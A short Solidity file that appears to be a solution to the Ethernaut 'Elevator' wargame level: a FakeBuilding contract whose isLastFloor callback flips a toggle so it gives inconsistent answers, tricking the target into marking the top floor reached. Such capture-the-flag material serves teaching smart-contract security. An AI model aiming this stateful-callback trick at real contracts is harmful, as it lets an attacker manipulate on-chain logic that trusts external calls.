// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Building, Elevator} from "./Elevator.sol";

contract FakeBuilding is Building {
    Elevator public elevator;
    bool public toggle;

    constructor(Elevator _elevator) {
        elevator = _elevator;
        toggle = true;
    }

    function exploit() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint256) external override returns (bool) {
        toggle = !toggle;
        return toggle;
    }
}
